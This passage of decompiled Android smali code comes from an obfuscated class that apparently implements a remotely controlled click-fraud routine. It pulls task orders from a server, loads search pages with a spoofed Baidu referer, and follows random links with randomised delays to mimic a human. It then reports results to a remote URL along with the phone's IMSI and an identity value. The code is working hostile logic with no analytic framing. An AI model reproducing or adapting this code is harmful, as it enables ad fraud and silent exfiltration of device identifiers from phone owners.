    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_0

    .line 531
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "?im="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 536
    :goto_1
    const-string v3, ""

    invoke-direct {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 537
    return-void

    .line 525
    .end local v2    # "url":Ljava/lang/String;
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 527
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 533
    .end local v0    # "e":Ljava/lang/Exception;
    .restart local v2    # "url":Ljava/lang/String;
    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "?imsi="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&way="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&result="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_1
.end method

.method private SleepTime(II)V
    .locals 4
    .param p1, "min"    # I
    .param p2, "max"    # I

    .prologue
    .line 395
    :try_start_0
    invoke-direct {p0, p1, p2}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v1

    .line 396
    .local v1, "sleeptime":I
    if-ltz v1, :cond_0

    if-le v1, p2, :cond_1

    .line 397
    :cond_0
    move v1, p1

    .line 400
    :cond_1
    mul-int/lit16 v2, v1, 0x3e8

    int-to-long v2, v2

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 406
    .end local v1    # "sleeptime":I
    :goto_0
    return-void

    .line 403
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 404
    .local v0, "e":Ljava/lang/InterruptedException;
    goto :goto_0
.end method

.method static synthetic access$0(Lcom/xxx/yyy/BBBB;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 62
    iput-object p1, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public Go()V
    .locals 14
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/16 v13, 0xf

    const/4 v12, 0x3

    const/4 v11, 0x5

    const/4 v9, 0x1

    const-string v10, ""

    .line 409
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    .line 410
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 415
    const-string v0, ""

    .line 416
    .local v0, "body":Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    const-string v8, ""

    invoke-direct {p0, v7, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 418
    .local v3, "order":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v7

    const/16 v8, 0xa

    if-le v7, v8, :cond_10

    .line 420
    const-string v7, "\\|"

    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    aget-object v7, v7, v8

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    iput v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    .line 421
    const-string v7, "\\|"

    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v5, v7, v9

    .line 424
    .local v5, "search":Ljava/lang/String;
    iput-object v5, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 425
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-eq v7, v12, :cond_0

    .line 428
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-le v7, v11, :cond_0

    .line 430
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    const-string v8, ""

    invoke-direct {p0, v7, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 434
    :cond_0
    const/16 v7, 0x1e

    invoke-direct {p0, v13, v7}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 436
    const-string v7, ""

    invoke-direct {p0, v5, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 438
    const-string v7, "http://wap.baidu.com/"

    invoke-direct {p0, v0, v7}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 440
    iput v9, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 441
    const-string v6, ""

    .line 442
    .local v6, "url":Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-eqz v7, :cond_1

    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    const/4 v8, 0x2

    if-ne v7, v8, :cond_4

    :cond_1
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_4

    .line 446
    const/4 v7, 0x2

    iput v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 448
    const/4 v7, -0x1

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v4

    .line 449
    .local v4, "pos":I
    if-ltz v4, :cond_2

    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sub-int/2addr v7, v9

    if-le v4, v7, :cond_3

    .line 450
    :cond_2
    const/4 v4, 0x0

    .line 451
    :cond_3
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    .end local v6    # "url":Ljava/lang/String;
    check-cast v6, Ljava/lang/String;

    .line 453
    .end local v4    # "pos":I
    .restart local v6    # "url":Ljava/lang/String;
    :cond_4
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v12, :cond_5

    .line 454
    const-string v6, ""

    .line 457
    :cond_5
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_6

    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v9, :cond_6

    .line 458
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    .line 462
    :cond_6
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 464
    const/4 v1, 0x0

    .line 465
    .local v1, "flag":Z
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_a

    .line 467
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v6, v7}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 468
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_7

    .line 469
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 470
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 472
    :cond_7
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-nez v7, :cond_9

    .line 473
    iput v11, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 474
    const/4 v1, 0x0

    .line 487
    :goto_0
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 489
    :goto_1
    if-eqz v1, :cond_8

    iget v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    if-lez v7, :cond_8

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-gtz v7, :cond_c

    .line 510
    :cond_8
    iget v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    invoke-direct {p0, v7}, Lcom/xxx/yyy/BBBB;->PostResult(I)V

    .line 512
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 513
    const-string v6, ""

    .line 515
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v7}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V

    .line 520
    return-void

    .line 477
    :cond_9
    const/4 v1, 0x1

    goto :goto_0

    .line 481
    :cond_a
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v12, :cond_b

    .line 482
    iput v12, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto :goto_0

    .line 484
    :cond_b
    const/4 v7, 0x4

    iput v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto :goto_0

    .line 491
    :cond_c
    invoke-direct {p0, v0, v6}, Lcom/xxx/yyy/BBBB;->FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 492
    .local v2, "head":Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 493
    invoke-direct {p0, v0, v2}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 494
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_f

    .line 496
    const/4 v7, -0x1

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v4

    .line 497
    .restart local v4    # "pos":I
    if-ltz v4, :cond_d

    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sub-int/2addr v7, v9

    if-le v4, v7, :cond_e

    .line 498
    :cond_d
    const/4 v4, 0x0

    .line 499
    :cond_e
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    .end local v6    # "url":Ljava/lang/String;
    check-cast v6, Ljava/lang/String;

    .line 500
    .restart local v6    # "url":Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v6, v7}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 501
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_f

    .line 502
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 503
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 506
    .end local v4    # "pos":I
    :cond_f
    iget v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    sub-int/2addr v7, v9

    iput v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    .line 507
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    goto :goto_1

    .line 518
    .end local v1    # "flag":Z
    .end local v2    # "head":Ljava/lang/String;
    .end local v5    # "search":Ljava/lang/String;
    .end local v6    # "url":Ljava/lang/String;
    :cond_10
    new-instance v7, Ljava/lang/Exception;

    const-string v8, "network disconnect!"

    invoke-direct {v7, v8}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v7
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 6
    .param p1, "stream"    # Ljava/io/InputStream;

    .prologue
    .line 121
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 122
    .local v3, "reader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 123
    .local v0, "buffer":Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 126
    .local v4, "sb":Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, "cur":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 135
    .end local v1    # "cur":Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 140
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 127
    .restart local v1    # "cur":Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 130
    .end local v1    # "cur":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 132
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 136
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 138
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public generateString(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p1, "stream"    # Ljava/io/InputStream;
    .param p2, "charSet"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/UnsupportedEncodingException;
        }
    .end annotation

    .prologue
    .line 143
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1, p2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 144
    .local v3, "reader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 145
    .local v0, "buffer":Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 148
    .local v4, "sb":Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, "cur":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 157
    .end local v1    # "cur":Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 162
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 149
    .restart local v1    # "cur":Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 152
    .end local v1    # "cur":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 154
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 158
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 160
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public getContentCharset(Lorg/apache/http/HttpResponse;)Ljava/lang/String;
    .locals 4
    .param p1, "response"    # Lorg/apache/http/HttpResponse;

    .prologue
    .line 273
    const-string v0, "ISO_8859-1"

    .line 274
    .local v0, "charset":Ljava/lang/String;
    invoke-interface {p1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v3

    invoke-interface {v3}, Lorg/apache/http/HttpEntity;->getContentType()Lorg/apache/http/Header;

    move-result-object v1

    .line 275
    .local v1, "header":Lorg/apache/http/Header;
    if-eqz v1, :cond_0

    .line 276
    invoke-interface {v1}, Lorg/apache/http/Header;->getValue()Ljava/lang/String;

    move-result-object v2

    .line 277
    .local v2, "s":Ljava/lang/String;
    const-string v3, "(charset)\\s?=\\s?(utf-?8)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 278
    const-string v0, "utf-8"

    .line 286
    .end local v2    # "s":Ljava/lang/String;
    :cond_0
    :goto_0
    return-object v0

    .line 280
    .restart local v2    # "s":Ljava/lang/String;
    :cond_1
    const-string v3, "(charset)\\s?=\\s?(gbk)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 281
    const-string v0, "gbk"

    goto :goto_0

    .line 282
    :cond_2
    const-string v3, "(charset)\\s?=\\s?(gb2312)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 283
    const-string v0, "gb2312"

    goto :goto_0
.end method

.method public matcher(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 3
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "pattern"    # Ljava/lang/String;

    .prologue
    .line 261
    const/16 v2, 0x42

    invoke-static {p2, v2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v1

    .line 263
    .local v1, "p":Ljava/util/regex/Pattern;
    invoke-virtual {v1, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    .line 264
    .local v0, "matcher":Ljava/util/regex/Matcher;
    invoke-virtual {v0}, Ljava/util/regex/Matcher;->find()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 265
    const/4 v2, 0x1

    .line 267
    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method
